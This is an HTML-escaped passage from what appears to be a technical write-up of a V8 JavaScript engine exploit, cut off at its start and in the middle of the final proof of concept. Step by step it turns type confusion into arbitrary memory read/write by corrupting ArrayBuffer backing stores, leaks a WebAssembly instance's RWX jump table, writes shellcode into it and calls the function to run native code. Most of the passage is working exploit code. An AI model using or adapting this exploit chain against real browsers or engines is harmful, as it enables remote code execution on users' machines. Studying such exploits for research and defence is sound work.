[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Corrupting&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;ArrayBuffer&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Backing&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Store&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Address&lt;/span&gt;...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Original&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Leaked&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Data&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x1aeda203210&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;DebugPrint&lt;/span&gt;: ...
 - backing_store: &lt;span class=&#34;hljs-number&#34;&gt;0000000041414141&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Now that we can overwrite backing_store, use two ArrayBuffers to build AAR/AAW primitives:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
    read64(addr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
    },
    write64(addr, ptr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = ptr;
    }
};&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Summary: using type confusion we first obtained relative R/W via overlapping properties; by corrupting &lt;code&gt;ArrayBuffer&lt;/code&gt; backing_store and employing two buffers we convert that into arbitrary-address R/W. &lt;/p&gt;
&lt;p&gt;Now let&amp;#x2019;s run the code and get code execution!&lt;/p&gt;
&lt;h2 id=&#34;1-2-AAR-W-&amp;#x2192;-RCE&#34;&gt;&lt;a href=&#34;#1-2-AAR-W-&amp;#x2192;-RCE&#34; class=&#34;headerlink&#34; title=&#34;1.2 AAR/W &amp;#x2192; RCE&#34;&gt;&lt;/a&gt;1.2 AAR/W &amp;#x2192; RCE&lt;/h2&gt;&lt;h3 id=&#34;Toward-Gaining-Code-Execution&#34;&gt;&lt;a href=&#34;#Toward-Gaining-Code-Execution&#34; class=&#34;headerlink&#34; title=&#34;Toward Gaining Code Execution&#34;&gt;&lt;/a&gt;Toward Gaining Code Execution&lt;/h3&gt;&lt;p&gt;Now that we have AAR/W, we need to execute code &amp;#x2014; but unfortunately we can&amp;#x2019;t just write shellcode into the V8 heap or an ArrayBuffer and run it, because DEP(Data Execution Prevention) is enabled. A common alternative is to target JIT memory.&lt;/p&gt;
&lt;p&gt;When JavaScript code is JIT-compiled, the compiler writes machine instructions into memory pages that must be executed, so those pages are typically given RWX(Read-Write-Execute) permissions. An attacker can leak a pointer to a JIT-compiled function, overwrite the code at that address with shellcode, and then call the function to run the shellcode.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;However&lt;/em&gt;, since 2018 the V8 team added &lt;code&gt;write_protect_code_memory&lt;/code&gt;. That protection flips JIT pages to RX (Read-Execute) at execution time and to RW(Read-Write) only when writing, so it&amp;#x2019;s no longer feasible to treat JIT memory as permanently RWX. As with pwnable challenges, one workaround is to build a ROP(Return-Oriented Programming) chain: manipulate vtables, JIT function pointers, or the stack to achieve code execution. ROP construction is fairly involved, though, so instead we&amp;#x2019;ll use a simpler and more reliable approach: &lt;strong&gt;WebAssembly(wasm)&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;WebAssembly-basics&#34;&gt;&lt;a href=&#34;#WebAssembly-basics&#34; class=&#34;headerlink&#34; title=&#34;WebAssembly basics&#34;&gt;&lt;/a&gt;WebAssembly basics&lt;/h3&gt;&lt;p&gt;WebAssembly is a binary format designed to run low-level code in the browser (often compiled from C/C++), and it interoperates with JavaScript.&lt;/p&gt;
&lt;p&gt;V8 does not fully optimize wasm code immediately; it first uses a baseline compiler called &lt;strong&gt;Liftoff&lt;/strong&gt; to produce machine code. Wasm also uses JIT memory, so machine code is placed in executable pages. Importantly, because of asm.js compatibility reasons, the write-protect flag for wasm was (at the time) typically disabled, which made wasm a very useful exploitation primitive.&lt;/p&gt;
&lt;p&gt;When a wasm module is instantiated in V8, function calls go through a &lt;strong&gt;jump table&lt;/strong&gt;. Each function slot in that table points to the actual machine code for the function (a &lt;code&gt;WasmCode&lt;/code&gt; object). Those pointers reference executable memory, so an attacker who can overwrite them could hijack execution. (Back in 2018 the wasm jump table in the V8 heap was readable/writable/executable and thus easy to hijack &amp;#x2014; modern V8 has hardened this, though &amp;#x315C;.&amp;#x315C;.)&lt;/p&gt;
&lt;h3 id=&#34;addrOf-function-re-building&#34;&gt;&lt;a href=&#34;#addrOf-function-re-building&#34; class=&#34;headerlink&#34; title=&#34;addrOf function re-building&#34;&gt;&lt;/a&gt;addrOf function re-building&lt;/h3&gt;&lt;p&gt;Using our read/write primitives we can leak the wasm instance object address and the RWX jump table pointer. However, the earlier &lt;code&gt;addrOf&lt;/code&gt; primitive relied on overlapping properties (which can corrupt other functionality), so we need a safer approach.&lt;/p&gt;
&lt;p&gt;We will build a new &lt;code&gt;addrOf&lt;/code&gt; by adding an &lt;strong&gt;out-of-line property&lt;/strong&gt; to an &lt;code&gt;ArrayBuffer&lt;/code&gt;, referencing the target object there, and then reading the property storage metadata via our memory read primitive to leak the object pointer. This avoids overwriting inline object fields.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Why this works&lt;/strong&gt;_&lt;br&gt;&lt;strong&gt;**An &lt;code&gt;ArrayBuffer&lt;/code&gt; manages raw bytes and, separately from inline properties, it has a &lt;/strong&gt;property storage**(property backing store). If we assign an object to an out-of-line property (e.g., &lt;code&gt;arrBuf.leakMe = obj&lt;/code&gt;), a pointer to the object is placed in that property storage. By using our arbitrary memory read primitive to inspect that property store&amp;#x2019;s metadata, we can indirectly obtain the object pointer. In other words, we can leak an object&amp;#x2019;s address without overwriting its fields.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
  addrOf(obj) {
    &lt;span class=&#34;hljs-comment&#34;&gt;// Set object address to new out-of-line property called leakme&lt;/span&gt;
    arrBuf2.leakMe = obj;
    &lt;span class=&#34;hljs-comment&#34;&gt;// Use read64 primitive to leak the properties backing store address of our array buffer&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; props = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(arrBuf2Addr + &lt;span class=&#34;hljs-number&#34;&gt;8n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
    &lt;span class=&#34;hljs-comment&#34;&gt;// Read offset 16 from the array buffer backing store and return the address of our object&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(props + &lt;span class=&#34;hljs-number&#34;&gt;16n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
  }
};&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Using this technique we can finally leak the &lt;code&gt;wasmInstance&lt;/code&gt; address and the RWX jump table pointer for that instance.&lt;/p&gt;
&lt;h2 id=&#34;1-3-RCE-PoC&#34;&gt;&lt;a href=&#34;#1-3-RCE-PoC&#34; class=&#34;headerlink&#34; title=&#34;1.3. RCE PoC&#34;&gt;&lt;/a&gt;1.3. RCE PoC&lt;/h2&gt;&lt;p&gt;Now let&amp;#x2019;s combine everything we&amp;#x2019;ve covered so far.&lt;/p&gt;
&lt;h3 id=&#34;1-Build-primitives&#34;&gt;&lt;a href=&#34;#1-Build-primitives&#34; class=&#34;headerlink&#34; title=&#34;[1] Build primitives&#34;&gt;&lt;/a&gt;[1] Build primitives&lt;/h3&gt;&lt;p&gt;Find the address of the second &lt;code&gt;ArrayBuffer&lt;/code&gt; with &lt;code&gt;addrOf&lt;/code&gt;, change the &lt;code&gt;backing_store&lt;/code&gt; pointer of the first buffer to point to the second buffer&amp;#x2019;s address, and then build memory read/write primitives from that.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Create Array Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Leak Address of arrBuf2&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking ArrayBuffer Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2Addr = addrOf(arrBuf2);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] ArrayBuffer Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${arrBuf2Addr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Corrupting ArrayBuffer Backing Store...&amp;quot;&lt;/span&gt;)
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

&lt;span class=&#34;hljs-comment&#34;&gt;// Store Original Backing Store Pointer of arrBuf2&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf1)
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf2BackingStore = view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]

&lt;span class=&#34;hljs-comment&#34;&gt;// Construct Memory Primitives via Array Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
  write(addr, bytes) {
    view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;(arrBuf2);
    view2.set(bytes);
  },
  read64(addr) {
    view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
  },
  write64(addr, ptr) {
    view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
    view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = ptr;
  },
  addrOf(obj) {
    arrBuf2.leakMe = obj;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; props = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(arrBuf2Addr + &lt;span class=&#34;hljs-number&#34;&gt;8n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(props + &lt;span class=&#34;hljs-number&#34;&gt;16n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
  }
};

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Constructed Memory Read and Write Primitive!&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2-Create-a-WebAssembly-instance&#34;&gt;&lt;a href=&#34;#2-Create-a-WebAssembly-instance&#34; class=&#34;headerlink&#34; title=&#34;[2] Create a WebAssembly instance&#34;&gt;&lt;/a&gt;[2] Create a WebAssembly instance&lt;/h3&gt;&lt;p&gt;This wasm code block compiles a simple &amp;#x201C;dummy function&amp;#x201D; into JIT memory. When the instance is created, an internal &lt;strong&gt;RWX jump table&lt;/strong&gt; is allocated. We can later overwrite that RWX memory with shellcode and execute it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Generating a WebAssembly Instance...&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Generate RWX region for Shellcode via WASM&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmCode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;133&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;131&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;129&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;145&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;111&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;114&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;121&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;138&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmModule = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Module(wasmCode);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmInstance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Instance(wasmModule);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; func = wasmInstance.exports.main;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-Leak-the-RWX-jump-table-pointer&#34;&gt;&lt;a href=&#34;#3-Leak-the-RWX-jump-table-pointer&#34; class=&#34;headerlink&#34; title=&#34;[3] Leak the RWX jump-table pointer&#34;&gt;&lt;/a&gt;[3] Leak the RWX jump-table pointer&lt;/h3&gt;&lt;p&gt;Using our primitive, obtain the wasm instance&amp;#x2019;s address and the jump-table start pointer.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Leak WebAssembly Instance Address and Jump Table Start Pointer&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking WebAssembly Instance Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmInstanceAddr = memory.addrOf(wasmInstance);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly Instance Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmInstanceAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmRWXAddr = memory.read64(wasmInstanceAddr + &lt;span class=&#34;hljs-number&#34;&gt;0xF0n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly RWX Jump Table Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmRWXAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;4-Inject-shellcode&#34;&gt;&lt;a href=&#34;#4-Inject-shellcode&#34; class=&#34;headerlink&#34; title=&#34;[4] Inject shellcode&#34;&gt;&lt;/a&gt;[4] Inject shellcode&lt;/h3&gt;&lt;p&gt;Read the jump-table pointer at offset &lt;code&gt;0xf0&lt;/code&gt; from the &lt;code&gt;wasmInstance&lt;/code&gt; object to obtain the RWX address. Use &lt;code&gt;read64&lt;/code&gt; to get the executable address, then write your shellcode there.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Leak WebAssembly Instance Address and Jump Table Start Pointer&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking WebAssembly Instance Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmInstanceAddr = memory.addrOf(wasmInstance);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly Instance Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmInstanceAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmRWXAddr = memory.read64(wasmInstanceAddr + &lt;span class=&#34;hljs-number&#34;&gt;0xF0n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly RWX Jump Table Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmRWXAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Preparing Shellcode...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Prepare Calc Shellcode&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; shellcode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;,...

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Writing Shellcode to Jump Table Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Write Shellcode to Jump Table Start Address&lt;/span&gt;
memory.write(wasmRWXAddr, shellcode);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;5-Call-the-wasm-function-to-execute-the-shellcode&#34;&gt;&lt;a href=&#34;#5-Call-the-wasm-function-to-execute-the-shellcode&#34; class=&#34;headerlink&#34; title=&#34;[5] Call the wasm function to execute the shellcode&#34;&gt;&lt;/a&gt;[5] Call the wasm function to execute the shellcode&lt;/h3&gt;&lt;p&gt;Finally, call the wasm function (&lt;code&gt;main&lt;/code&gt;). Since the jump table now points to our shellcode, invoking the function will execute it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Execute our Shellcode&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Popping Calc...&amp;quot;&lt;/span&gt;);
func();&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This completes the chain from a JavaScript-initiated bug to native code execution.&lt;/p&gt;
&lt;p&gt;Below is the final PoC reflecting the above steps.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As mentioned in Part 1, these tests were performed on Linux. To port the PoC from Windows to Linux you only need to change the shellcode. I replaced the Windows calc shellcode with a shell-launching shellcode and executed it on Linux.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Conversion Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; floatView = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Float64Array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; uint64View = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(floatView.buffer);

&lt;span class=&#34;hljs-built_in&#34;&gt;Number&lt;/span&gt;.prototype.toBigInt = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;toBigInt&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    floatView[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uint64View[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
};

BigInt.prototype.toNumber = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;toNumber&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    uint64View[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; floatView[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
};

&lt;span class=&#34;hljs-comment&#34;&gt;// Function that creates an object with one in-line and 32 out-of-line properties&lt;/span&gt;
